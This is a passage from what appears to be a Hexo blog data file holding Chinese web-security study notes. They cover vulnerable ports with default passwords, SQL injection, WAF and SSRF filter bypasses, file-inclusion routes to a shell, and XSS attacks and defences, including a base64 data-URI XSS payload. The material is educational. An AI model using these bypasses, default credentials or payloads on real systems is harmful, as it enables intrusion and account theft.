title=\"文件包含如何getshell\"></a>文件包含如何getshell</h2><ol>\n<li><p>远程文件包含：可以直接执行任意代码</p>\n<hr>\n<p>下面是本地包含</p>\n<hr>\n</li>\n<li><p>上传图片马包含</p>\n</li>\n<li><p>包含日志文件Getshell</p>\n</li>\n<li><p>利用data伪协议和php://input流执行php代码</p>\n</li>\n<li><p>存在phpinfo信息泄露可包含临时文件</p>\n</li>\n<li><p>包涵session文件</p>\n</li>\n</ol>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"基础知识\"><a href=\"#基础知识\" class=\"headerlink\" title=\"基础知识\"></a>基础知识</h1><hr>\n<h2 id=\"常见的端口\"><a href=\"#常见的端口\" class=\"headerlink\" title=\"常见的端口\"></a>常见的端口</h2><table>\n<thead>\n<tr>\n<th align=\"center\">端口号</th>\n<th align=\"center\">服务</th>\n<th align=\"center\">漏洞</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">21</td>\n<td align=\"center\">ftp</td>\n<td align=\"center\"></td>\n</tr>\n<tr>\n<td align=\"center\">22</td>\n<td align=\"center\">ssh</td>\n<td align=\"center\"></td>\n</tr>\n<tr>\n<td align=\"center\">23</td>\n<td align=\"center\">telnet</td>\n<td align=\"center\"></td>\n</tr>\n<tr>\n<td align=\"center\">161</td>\n<td align=\"center\">snmp</td>\n<td align=\"center\"></td>\n</tr>\n<tr>\n<td align=\"center\">443</td>\n<td align=\"center\">openssl</td>\n<td align=\"center\">心脏滴血</td>\n</tr>\n<tr>\n<td align=\"center\">837</td>\n<td align=\"center\">Rsync</td>\n<td align=\"center\">未授权</td>\n</tr>\n<tr>\n<td align=\"center\">1433</td>\n<td align=\"center\">MSSSQL</td>\n<td align=\"center\"></td>\n</tr>\n<tr>\n<td align=\"center\">1521</td>\n<td align=\"center\">Oracle</td>\n<td align=\"center\"></td>\n</tr>\n<tr>\n<td align=\"center\">2375</td>\n<td align=\"center\">docker</td>\n<td align=\"center\">未授权</td>\n</tr>\n<tr>\n<td align=\"center\">3306</td>\n<td align=\"center\">Mysql</td>\n<td align=\"center\"></td>\n</tr>\n<tr>\n<td align=\"center\">3389</td>\n<td align=\"center\">远程连接</td>\n<td align=\"center\"></td>\n</tr>\n<tr>\n<td align=\"center\">5432</td>\n<td align=\"center\">PostgreSQL</td>\n<td align=\"center\"></td>\n</tr>\n<tr>\n<td align=\"center\">5900</td>\n<td align=\"center\">vnc</td>\n<td align=\"center\"></td>\n</tr>\n<tr>\n<td align=\"center\">6379</td>\n<td align=\"center\">redis</td>\n<td align=\"center\">未授权</td>\n</tr>\n<tr>\n<td align=\"center\">7001,7002,7003</td>\n<td align=\"center\">Weblogic</td>\n<td align=\"center\">默认弱口令，反序列</td>\n</tr>\n<tr>\n<td align=\"center\">9000</td>\n<td align=\"center\">fastcgi-php</td>\n<td align=\"center\"></td>\n</tr>\n<tr>\n<td align=\"center\">9200,9300</td>\n<td align=\"center\">elasticsearch</td>\n<td align=\"center\">CVE-2015-1427,CVE-2014-3120</td>\n</tr>\n<tr>\n<td align=\"center\">11211</td>\n<td align=\"center\">memcache</td>\n<td align=\"center\">未授权</td>\n</tr>\n<tr>\n<td align=\"center\">27017,27018</td>\n<td align=\"center\">Mongodb</td>\n<td align=\"center\">未授权访问</td>\n</tr>\n<tr>\n<td align=\"center\">1099</td>\n<td align=\"center\">rmi</td>\n<td align=\"center\">命令执行</td>\n</tr>\n<tr>\n<td align=\"center\">2601,2604</td>\n<td align=\"center\">zebra</td>\n<td align=\"center\">路由，默认密码 zebra</td>\n</tr>\n<tr>\n<td align=\"center\">3128</td>\n<td align=\"center\">squid</td>\n<td align=\"center\">代理默认端口</td>\n</tr>\n<tr>\n<td align=\"center\">4440</td>\n<td align=\"center\">rundeck</td>\n<td align=\"center\"></td>\n</tr>\n<tr>\n<td align=\"center\">4848</td>\n<td align=\"center\">glassfish</td>\n<td align=\"center\">中间件弱口令 admin/adminadmin</td>\n</tr>\n<tr>\n<td align=\"center\">5984</td>\n<td align=\"center\">CouchDB</td>\n<td align=\"center\"><a href=\"http://xxx:5984/_utils/\" target=\"_blank\" rel=\"noopener\">http://xxx:5984/_utils/</a></td>\n</tr>\n<tr>\n<td align=\"center\">8000</td>\n<td align=\"center\">jdwp java</td>\n<td align=\"center\">调试接口命令执行</td>\n</tr>\n<tr>\n<td align=\"center\">9043</td>\n<td align=\"center\">websphere</td>\n<td align=\"center\">弱口令 admin/admin</td>\n</tr>\n<tr>\n<td align=\"center\">50000</td>\n<td align=\"center\">SAP</td>\n<td align=\"center\">命令执行</td>\n</tr>\n<tr>\n<td align=\"center\">50060,50070,50030</td>\n<td align=\"center\">hadoop</td>\n<td align=\"center\">默认端口未授权访问</td>\n</tr>\n</tbody></table>\n<h2 id=\"SQL注入类型\"><a href=\"#SQL注入类型\" class=\"headerlink\" title=\"SQL注入类型\"></a>SQL注入类型</h2><p>数字型，字符型，搜索型</p>\n<h2 id=\"联合查询的条件（union-select）\"><a href=\"#联合查询的条件（union-select）\" class=\"headerlink\" title=\"联合查询的条件（union select）\"></a>联合查询的条件（union select）</h2><ol>\n<li>页面有注入回显</li>\n<li>拼接的两个结果集必须有相同列数,列的数据类型相同</li>\n</ol>\n<h2 id=\"DNSlog知道吗？是否能在Linux利用\"><a href=\"#DNSlog知道吗？是否能在Linux利用\" class=\"headerlink\" title=\"DNSlog知道吗？是否能在Linux利用\"></a>DNSlog知道吗？是否能在Linux利用</h2><p><a href=\"https://www.anquanke.com/post/id/98096\" target=\"_blank\" rel=\"noopener\">https://www.anquanke.com/post/id/98096</a></p>\n<p><img src=\"/img/knowledge/web/001.jpg\" alt=\"001\"></p>\n<p>load_file函数在Linux下是无法用来做dnslog攻击的，因为在这里就涉及到Windows的UNC路径</p>\n<h2 id=\"绕过waf的方法\"><a href=\"#绕过waf的方法\" class=\"headerlink\" title=\"绕过waf的方法\"></a>绕过waf的方法</h2><p><a href=\"https://www.freebuf.com/column/163469.html\" target=\"_blank\" rel=\"noopener\">https://www.freebuf.com/column/163469.html</a></p>\n<h2 id=\"利用过参数污染绕过waf吗？\"><a href=\"#利用过参数污染绕过waf吗？\" class=\"headerlink\" title=\"利用过参数污染绕过waf吗？\"></a>利用过参数污染绕过waf吗？</h2><p>在跟服务器交互的过程中，http允许 get 或者post多次传同一参数值，造成覆盖达到一些绕过waf的效果。</p>\n<figure class=\"highlight http\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">GET</span> <span class=\"string\">/foo?par1=val1&amp;par2=val2</span> HTTP/1.1</span><br><span class=\"line\"><span class=\"attribute\">User-Agent</span>: Mozilla/5.0</span><br><span class=\"line\"><span class=\"attribute\">Host</span>: Host</span><br><span class=\"line\"><span class=\"attribute\">Accept</span>: */*</span><br></pre></td></tr></table></figure>\n\n<p>如上面的http请求，一般同一参数名字只能传参一次，但是http协议中允许同样名称的参数出现多次。</p>\n<p>不同的服务器处理结果会不一样，利用这个特性进行绕过。</p>\n<h2 id=\"XSS类型\"><a href=\"#XSS类型\" class=\"headerlink\" title=\"XSS类型\"></a>XSS类型</h2><p>反射型，存储型，DOM型</p>\n<h2 id=\"xss可利用的协议\"><a href=\"#xss可利用的协议\" class=\"headerlink\" title=\"xss可利用的协议\"></a>xss可利用的协议</h2><p>javascript 伪协议，data 协议，MHTML注射XSS</p>\n<h2 id=\"同源策略\"><a href=\"#同源策略\" class=\"headerlink\" title=\"同源策略\"></a>同源策略</h2><p>3同，同域名同端口同协议。作用就是防止文档或脚本从不同源加载。</p>\n<h2 id=\"CSRF\"><a href=\"#CSRF\" class=\"headerlink\" title=\"CSRF\"></a>CSRF</h2><p>定义：攻击者劫持用户访问web站点执行非用户本意的操作。</p>\n<p>完成csrf的即可条件：</p>\n<ol>\n<li>受害者处于登录状态</li>\n<li>诱使用受害者点击连接</li>\n<li>系统对敏感操作没有进行验证</li>\n</ol>\n<h2 id=\"常见的请求方式有哪些\"><a href=\"#常见的请求方式有哪些\" class=\"headerlink\" title=\"常见的请求方式有哪些\"></a>常见的请求方式有哪些</h2><p>post,get,options,head,connect,trace,delete,put</p>\n<h2 id=\"ssrf利用协议\"><a href=\"#ssrf利用协议\" class=\"headerlink\" title=\"ssrf利用协议\"></a>ssrf利用协议</h2><p>最具代表性几个，dict操作redis,file任意文件读，gopher反弹shell，tftp发起udp拒绝服务</p>\n<h2 id=\"ssrf无回显怎么办\"><a href=\"#ssrf无回显怎么办\" class=\"headerlink\" title=\"ssrf无回显怎么办\"></a>ssrf无回显怎么办</h2><p>利用dnslog</p>\n<h2 id=\"ssrf如何绕过方式\"><a href=\"#ssrf如何绕过方式\" class=\"headerlink\" title=\"ssrf如何绕过方式\"></a>ssrf如何绕过方式</h2><p>1）<a href=\"http://www.baidu.com@10.10.10.xn--10http-4p7i//10.10.10.10\" target=\"_blank\" rel=\"noopener\">http://www.baidu.com@10.10.10.10与http://10.10.10.10</a> 请求是相同的</p>\n<p>此脚本访问请求得到的内容都是10.10.10.10的内容。</p>\n<p>该绕过同样在URL跳转绕过中适用。</p>\n<p><a href=\"http://www.wooyun.org/bugs/wooyun-2015-091690\" target=\"_blank\" rel=\"noopener\">http://www.wooyun.org/bugs/wooyun-2015-091690</a></p>\n<blockquote>\n<p>乌云镜像的url中的html替换为wooyun-2015-091690.html</p>\n</blockquote>\n<p>2）ip地址转换成进制来访问</p>\n<p>115.239.210.26 ＝ 16373751032</p>\n<p>3）添加端口可能绕过匹配正则</p>\n<p>10.10.10.10:80 案例：</p>\n<p><a href=\"http://www.wooyun.org/bugs/wooyun-2014-061850\" target=\"_blank\" rel=\"noopener\">http://www.wooyun.org/bugs/wooyun-2014-061850</a></p>\n<blockquote>\n<p>乌云镜像的url中的html替换为wooyun-2014-061850.html</p>\n</blockquote>\n<p>4）localhost绕过</p>\n<p>5）用短地址（302跳转）绕过，案例:</p>\n<p>搜狐某云平台API接口SSRF续集-绕过:<a href=\"https://bugs.shuimugan.com/bug/view?bug_no=0132243\" target=\"_blank\" rel=\"noopener\">https://bugs.shuimugan.com/bug/view?bug_no=0132243</a></p>\n<p>神器而已之奇虎360某SSRF绕过限制代理访问内网:<a href=\"https://bugs.shuimugan.com/bug/view?bug_no=0135257\" target=\"_blank\" rel=\"noopener\">https://bugs.shuimugan.com/bug/view?bug_no=0135257</a></p>\n<p>5）利用xip.io和xip.name</p>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">10<span class=\"selector-class\">.0</span><span class=\"selector-class\">.0</span><span class=\"selector-class\">.1</span><span class=\"selector-class\">.xip</span><span class=\"selector-class\">.io</span> 10<span class=\"selector-class\">.0</span><span class=\"selector-class\">.0</span><span class=\"selector-class\">.1</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-tag\">www</span><span class=\"selector-class\">.10</span><span class=\"selector-class\">.0</span><span class=\"selector-class\">.0</span><span class=\"selector-class\">.1</span><span class=\"selector-class\">.xip</span><span class=\"selector-class\">.io</span> 10<span class=\"selector-class\">.0</span><span class=\"selector-class\">.0</span><span class=\"selector-class\">.1</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-tag\">mysite</span><span class=\"selector-class\">.10</span><span class=\"selector-class\">.0</span><span class=\"selector-class\">.0</span><span class=\"selector-class\">.1</span><span class=\"selector-class\">.xip</span><span class=\"selector-class\">.io</span> 10<span class=\"selector-class\">.0</span><span class=\"selector-class\">.0</span><span class=\"selector-class\">.1</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-tag\">foo</span><span class=\"selector-class\">.bar</span><span class=\"selector-class\">.10</span><span class=\"selector-class\">.0</span><span class=\"selector-class\">.0</span><span class=\"selector-class\">.1</span><span class=\"selector-class\">.xip</span><span class=\"selector-class\">.io</span> 10<span class=\"selector-class\">.0</span><span class=\"selector-class\">.0</span><span class=\"selector-class\">.1</span></span><br><span class=\"line\">10<span class=\"selector-class\">.0</span><span class=\"selector-class\">.0</span><span class=\"selector-class\">.1</span><span class=\"selector-class\">.xip</span><span class=\"selector-class\">.name</span>  <span class=\"selector-tag\">resolves</span> <span class=\"selector-tag\">to</span>  10<span class=\"selector-class\">.0</span><span class=\"selector-class\">.0</span><span class=\"selector-class\">.1</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-tag\">www</span><span class=\"selector-class\">.10</span><span class=\"selector-class\">.0</span><span class=\"selector-class\">.0</span><span class=\"selector-class\">.2</span><span class=\"selector-class\">.xip</span><span class=\"selector-class\">.name</span>  <span class=\"selector-tag\">resolves</span> <span class=\"selector-tag\">to</span>  10<span class=\"selector-class\">.0</span><span class=\"selector-class\">.0</span><span class=\"selector-class\">.2</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-tag\">foo</span><span class=\"selector-class\">.10</span><span class=\"selector-class\">.0</span><span class=\"selector-class\">.0</span><span class=\"selector-class\">.3</span><span class=\"selector-class\">.xip</span><span class=\"selector-class\">.name</span>  <span class=\"selector-tag\">resolves</span> <span class=\"selector-tag\">to</span>  10<span class=\"selector-class\">.0</span><span class=\"selector-class\">.0</span><span class=\"selector-class\">.3</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-tag\">bar</span><span class=\"selector-class\">.baz</span><span class=\"selector-class\">.10</span><span class=\"selector-class\">.0</span><span class=\"selector-class\">.0</span><span class=\"selector-class\">.4</span><span class=\"selector-class\">.xip</span><span class=\"selector-class\">.name</span>  <span class=\"selector-tag\">resolves</span> <span class=\"selector-tag\">to</span>  10<span class=\"selector-class\">.0</span><span class=\"selector-class\">.0</span><span class=\"selector-class\">.4</span></span><br></pre></td></tr></table></figure>\n\n<p>6）利用Enclosed alphanumerics</p>\n<figure class=\"highlight ruby\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">利用Enclosed alphanumerics</span><br><span class=\"line\">ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ  <span class=\"meta\">&gt;&gt;&gt;  </span>example.com</span><br><span class=\"line\"><span class=\"symbol\">List:</span></span><br><span class=\"line\">① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ ⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ ⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ ⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿</span><br></pre></td></tr></table></figure>\n\n<p>7) 利用句号</p>\n<figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">127</span>。<span class=\"number\">0</span>。<span class=\"number\">0</span>。<span class=\"number\">1</span>  &gt;&gt;&gt;  <span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"文件包含有哪些伪协议\"><a href=\"#文件包含有哪些伪协议\" class=\"headerlink\" title=\"文件包含有哪些伪协议\"></a>文件包含有哪些伪协议</h2><p><a href=\"https://www.yingyingguaier.top/2019/01/03/php%20%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E4%BC%AA%E5%8D%8F%E8%AE%AE%E5%88%A9%E7%94%A8/#more\" target=\"_blank\" rel=\"noopener\">https://www.yingyingguaier.top/2019/01/03/php%20%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E4%BC%AA%E5%8D%8F%E8%AE%AE%E5%88%A9%E7%94%A8/#more</a></p>\n<h2 id=\"文件包含如何getshell\"><a href=\"#文件包含如何getshell\" class=\"headerlink\" title=\"文件包含如何getshell\"></a>文件包含如何getshell</h2><ol>\n<li><p>远程文件包含：可以直接执行任意代码</p>\n<hr>\n<p>下面是本地包含</p>\n<hr>\n</li>\n<li><p>上传图片马包含</p>\n</li>\n<li><p>包含日志文件Getshell</p>\n</li>\n<li><p>利用data伪协议和php://input流执行php代码</p>\n</li>\n<li><p>存在phpinfo信息泄露可包含临时文件</p>\n</li>\n<li><p>包涵session文件</p>\n</li>\n</ol>\n"},{"title":"XSS跨站脚本-笔记","date":"2018-12-25T13:13:14.000Z","_content":"\n# XSS跨站脚本-笔记\n\n---\n\n## XSS危害\n\n```shell\n1.网络钓鱼,盗取用户账号\n2.窃取用户cookie,利用用户身份进一步对网站执行操作\n3.强制弹广告,刷流量\n4.网页挂马  \n5.客户端攻击,DDOS等\n6.获取客户端信息,如浏览历史,真实ip,端口\n7.结合csrf\n8.提升用户权限,进一步渗透网站\n9.跨站脚本蠕虫\n等\n```\n\n### 如何利用XSS提权?\n\n如果后台存在XSS,当管理员触发时,可以利用JavaScript发送请求,该请求携带管理员的Cookie发送到服务器,在后台添加一个新管理员用户。（涉及Ajax技术）\n\n### 利用XSS获取Webshell?\n\n1.特殊情况：Access+ASP架构，网站管理员出于某些原因把数据库文件后缀修改成ASP。\n\n网站存在存储型XSS，攻击者可写入一句话木马来getshell.\n\n2.后台存在存储型XSS，且后台具有数据库备份功能。攻击者上传含有一句话木马的图片，通过XSS劫持管理员会话将上传的图片重备份为Webshell。\n\n### 网络钓鱼\n\n钓鱼页面由以下几个部分组成\n\n1. 钓鱼页面，经常是登录表单部分\n2. 记录受害者登录信息的脚本\n3. XSS phishing Expliot :在有xss的页面插入利用代码\niframe框架的巧妙利用，覆盖原页面，迷惑性强\n\n### 如果设置了Httponly如何利用XSS\n\n1. 直接获取用户的明文账户密码信息，监听键盘记录\n\n2. 进行会话劫持\n\n   https://www.freebuf.com/articles/web/129384.html\n\n### XSS获取客户端信息\n\n1. 利用JS获取CSS信息（CSS信息能定义访问过和未访问过的超链接样式）\n2. JS实现漏洞扫描\n3. 获取剪贴板内容\n4. 获取IP地址\n\n### XSS如何网页挂马？\n\n攻击者通过篡改网页来实现，最常见的案例是利用一个长宽属性为0的`<iframe>`标签来加载木马页面。或者用JS动态调用网页木马。\n\n### XSS发动DOS/DDOS的情况？\n\n利用XSS恶意代码对网站不断发送请求，还可以劫持大量浏览器来实施攻击。\n\n### DOM型XSS的特殊性\n\nDOM型虽然和反射型类似，都需要诱使用户点击url，但是DOM型的url不需要经过服务器，在客户端浏览器就能执行。\n\n### 同源策略\n\n同协议，同域名，同端口，可以防止从不同域装载文档或脚本。\n\n跨域方法：JSONP,Iframe,Flash\n\n### XSS结合\n\n#### CSRF\n\nCSRF攻击能够劫持终端用户在已登录的Web站点上执行非本意的操作。\n\n案例：iGaming CMS后台存在CSRF漏洞，后台利用Requests接收，可以改造添加管理元的url诱使管理员访问。\n\n### CRLF注射\n\n利用单个\\r\\n可以注入会话cookie(会话固定)，两个\\r\\n可以注入HTML/JavaScript代码。\n\n案例：某校园网登录界面存在CRLF注射，利用两个%0d%a可以执行js代码。\n\n#### MHTML协议\n\n格式：mhtml:http://127.0.0.1/demo.html!demo\n\nhttp://127.0.0.1/demo.html 对应 【Mhtml_File_Url】\n\ndemo 对应 【Original_Resource_Url】\n\n【Original_Resource_Url】从消息体的Content-Location获得，如果不能从【Mhtml_File_Url】获得，会主动去【Original_Resource_Url】取获取下载内容。\n\n案例：豆瓣搜索文本出现过MHTML协议代码注射问题，能够执行XSS。\n\n#### DATA URI\n\n常用来绕过XSS的过滤\n\n```html\n<a href=data:text/html;base64,PHNjcmlwdD5hbGVydCgzKTwvc2NyaXB0Pg==>\n```\n\n## 防御XSS\n\n### 输入过滤\n\n#### 输入验证\n\n控制输入的格式\n\n#### 数据消毒\n过滤敏感字符\n\n```\n< > ' \" & # javascript expression\n```\n\n### 输出编码\n\n对敏感字符进行转义，将HTML特殊字符转成字符实体编码。\n\n### 黑名单和白名单\n\n### DOM型\n\n1. 避免客户端文档重写、重定向或其他敏感操作\n2. 分析和强化客户端JS代码，尤其是一些受用户影响的DOM对象。Referrer属性，windowsname属性等","source":"_posts/XSS跨站脚本-笔记.md","raw":"---\ntitle: XSS跨站脚本-笔记\ndate: 2018-12-25 21:13:14\ntags: [XSS]\ncategories:\n  - [XSS]\n  - [整理]\n---\n\n# XSS跨站脚本-笔记\n\n---\n\n## XSS危害\n\n```shell\n1.网络钓鱼,盗取用户账号\n2.窃取用户cookie,利用用户身份进一步对网站执行操作\n3.强制弹广告,刷流量\n4.网页挂马  \n5.客户端攻击,DDOS等\n6.获取客户端信息,如浏览历史,真实ip,端口\n7.结合csrf\n8.提升用户权限,进一步渗透网站\n9.跨站脚本蠕虫\n等\n```\n\n### 如何利用XSS提权?\n\n如果后台存在XSS,当管理员触发时,可以利用JavaScript发送请求,该请求携带管理员的Cookie发送到服务器,在后台添加一个新管理员用户。（涉及Ajax技术）\n\n### 利用XSS获取Webshell?\n\n1.特殊情况：Access+ASP架构，网站管理员出于某些原因把数据库文件后缀修改成ASP。\n\n网站存在存储型XSS，攻击者可写入一句话木马来getshell.\n\n2.后台存在存储型XSS，且后台具有数据库备份功能。攻击者上传含有一句话木马的图片，通过XSS劫持管理员会话将上传的图片重备份为Webshell。\n\n### 网络钓鱼\n\n钓鱼页面由以下几个部分组成\n\n1. 钓鱼页面，经常是登录表单部分\n2. 记录受害者登录信息的脚本\n3. XSS phishing Expliot :在有xss的页面插入利用代码\niframe框架的巧妙利用，覆盖原页面，迷惑性强\n\n### 如果设置了Httponly如何利用XSS\n\n1. 直接获取用户的明文账户密码信息，监听键盘记录\n\n2. 进行会话劫持\n\n   https://www.freebuf.com/articles/web/129384.html\n\n### XSS获取客户端信息\n\n1. 利用JS获取CSS信息（CSS信息能定义访问过和未访问过的超链接样式）\n2. JS实现漏洞扫描\n3. 获取剪贴板内容\n4. 获取IP地址\n\n### XSS如何网页挂马？\n\n攻击者通过篡改网页来实现，最常见的案例是利用一个长宽属性为0的`<iframe>`标签来加载木马页面。或者用JS动态调用网页木马。\n\n### XSS发动DOS/DDOS的情况？\n\n利用XSS恶意代码对网站不断发送请求，还可以劫持大量浏览器来实施攻击。\n\n### DOM型XSS的特殊性\n\nDOM型虽然和反射型类似，都需要诱使用户点击url，但是DOM型的url不需要经过服务器，在客户端浏览器就能执行。\n\n### 同源策略\n\n同协议，同域名，同端口，可以防止从不同域装载文档或脚本。\n\n跨域方法：JSONP,Iframe,Flash\n\n### XSS结合\n\n#### CSRF\n\nCSRF攻击能够劫持终端用户在已登录的Web站点上执行非本意的操作。\n\n案例：iGaming CMS后台存在CSRF漏洞，后台利用Requests接收，可以改造添加管理元的url诱使管理员访问。\n\n### CRLF注射\n\n利用单个\\r\\n可以注入会话cookie(会话固定)，两个\\r\\n可以注入HTML/JavaScript代码。\n\n案例：某校园网登录界面存在CRLF注射，利用两个%0d%a可以执行js代码。\n\n#### MHTML协议\n\n格式：mhtml:http://127.0.0.1/demo.html!demo\n\nhttp://127.0.0.1/demo.html 对应 【Mhtml_File_Url】\n\ndemo 对应 【Original_Resource_Url】\n\n【Original_Resource_Url】从消息体的Content-Location获得，如果不能从【Mhtml_File_Url】获得，会主动去【Original_Resource_Url】取获取下载内容。\n\n案例：豆瓣搜索文本出现过MHTML协议代码注射问题，能够执行XSS。\n\n#### DATA URI\n\n常用来绕过XSS的过滤\n\n```html\n<a href=data:text/html;base64,PHNjcmlwdD5hbGVydCgzKTwvc2NyaXB0Pg==>\n```\n\n## 防御XSS\n\n### 输入过滤\n\n#### 输入验证\n\n控制输入的格式\n\n#### 数据消毒\n过滤敏感字符\n\n```\n< > ' \" & # javascript expression\n```\n\n### 输出编码\n\n对敏感字符进行转义，将HTML特殊字符转成字符实体编码。\n\n### 黑名单和白名单\n\n### DOM型\n\n1. 避免客户端文档重写、重定向或其他敏感操作\n2. 分析和强化客户端JS代码，尤其是一些受用户影响的DOM对象。Referrer属性，windowsname属性等","slug":"XSS跨站脚本-笔记","published":1,"updated":"2019-06-19T17:23:13.382Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjx3istc4000x4dsbyadef02w","content":"<h1 id=\"XSS跨站脚本-笔记\"><a href=\"#XSS跨站脚本-笔记\" class=\"headerlink\" title=\"XSS跨站脚本-笔记\"></a>XSS跨站脚本-笔记</h1><hr>\n<h2 id=\"XSS危害\"><a href=\"#XSS危害\" class=\"headerlink\" title=\"XSS危害\"></a>XSS危害</h2><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.网络钓鱼,盗取用户账号</span><br><span class=\"line\">2.窃取用户cookie,利用用户身份进一步对网站执行操作</span><br><span class=\"line\">3.强制弹广告,刷流量</span><br><span class=\"line\">4.网页挂马  </span><br><span class=\"line\">5.客户端攻击,DDOS等</span><br><span class=\"line\">6.获取客户端信息,如浏览历史,真实ip,端口</span><br><span class=\"line\">7.结合csrf</span><br><span class=\"line\">8.提升用户权限,进一步渗透网站</span><br><span class=\"line\">9.跨站脚本蠕虫</span><br><span class=\"line\">等</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"如何利用XSS提权\"><a href=\"#如何利用XSS提权\" class=\"headerlink\" title=\"如何利用XSS提权?\"></a>如何利用XSS提权?</h3><p>如果后台存在XSS,当管理员触发时,可以利用JavaScript发送请求,该请求携带管理员的Cookie发送到服务器,在后台添加一个新管理员用户。（涉及Ajax技术）</p>\n<h3 id=\"利用XSS获取Webshell\"><a href=\"#利用XSS获取Webshell\" class=\"headerlink\" title=\"利用XSS获取Webshell?\"></a>利用XSS获取Webshell?</h3><p>1.特殊情况：Access+ASP架构，网站管理员出于某些原因把数据库文件后缀修改成ASP。</p>\n<p>网站存在存储型XSS，攻击者可写入一句话木马来getshell.</p>\n<p>2.后台存在存储型XSS，且后台具有数据库备份功能。攻击者上传含有一句话木马的图片，通过XSS劫持管理员会话将上传的图片重备份为Webshell。</p>\n<h3 id=\"网络钓鱼\"><a href=\"#网络钓鱼\" class=\"headerlink\" title=\"网络钓鱼\"></a>网络钓鱼</h3><p>钓鱼页面由以下几个部分组成</p>\n<ol>\n<li>钓鱼页面，经常是登录表单部分</li>\n<li>记录受害者登录信息的脚本</li>\n<li>XSS phishing Expliot :在有xss的页面插入利用代码<br>iframe框架的巧妙利用，覆盖原页面，迷惑性强</li>\n</ol>\n<h3 id=\"如果设置了Httponly如何利用XSS\"><a href=\"#如果设置了Httponly如何利用XSS\" class=\"headerlink\" title=\"如果设置了Httponly如何利用XSS\"></a>如果设置了Httponly如何利用XSS</h3><ol>\n<li><p>直接获取用户的明文账户密码信息，监听键盘记录</p>\n</li>\n<li><p>进行会话劫持</p>\n<p><a href=\"https://www.freebuf.com/articles/web/129384.html\" target=\"_blank\" rel=\"noopener\">https://www.freebuf.com/articles/web/129384.html</a></p>\n</li>\n</ol>\n<h3 id=\"XSS获取客户端信息\"><a href=\"#XSS获取客户端信息\" class=\"headerlink\" title=\"XSS获取客户端信息\"></a>XSS获取客户端信息</h3><ol>\n<li>利用JS获取CSS信息（CSS信息能定义访问过和未访问过的超链接样式）</li>\n<li>JS实现漏洞扫描</li>\n<li>获取剪贴板内容</li>\n<li>获取IP地址</li>\n</ol>\n<h3 id=\"XSS如何网页挂马？\"><a href=\"#XSS如何网页挂马？\" class=\"headerlink\" title=\"XSS如何网页挂马？\"></a>XSS如何网页挂马？</h3><p>攻击者通过篡改网页来实现，最常见的案例是利用一个长宽属性为0的<code>&lt;iframe&gt;</code>标签来加载木马页面。或者用JS动态调用网页木马。</p>\n<h3 id=\"XSS发动DOS-DDOS的情况？\"><a href=\"#XSS发动DOS-DDOS的情况？\" class=\"headerlink\" 